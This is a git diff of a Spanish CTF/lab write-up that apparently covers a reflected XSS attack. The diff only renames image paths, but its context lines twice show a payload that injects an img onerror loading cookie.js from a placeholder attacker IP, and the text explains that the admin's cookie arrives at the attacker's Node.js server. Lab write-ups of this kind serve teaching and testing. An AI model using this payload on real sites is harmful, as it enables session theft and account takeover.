@@ -500,7 +500,7 @@ URL = trr0rlabs.bbl/form.php/"><img src/onerror=import("http:<IP_ATTACKER>:8000/
 
 En la consola de la pagina veremos que ha funcionado:
 
-<figure><img src="../../.gitbook/assets/image (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../.gitbook/assets/image (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>
 
 Y si volvemos a donde tenemos lanzado el servidor de `Node.js` veremos lo siguiente:
 
@@ -516,7 +516,7 @@ Vemos que lo capturo de forma correcta, pero sera la de nuestro `usuario` para o
 http://trr0rlabs.bbl/form.php/"><img src/onerror=import("http:<IP_ATTACKER>:8000/cookie.js")>
 ```
 
-<figure><img src="../../.gitbook/assets/image (2) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../.gitbook/assets/image (2) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>
 
 Ahora si esperamos un poco veremos que nos llega la `Cookie` del usuario `admin`.
 
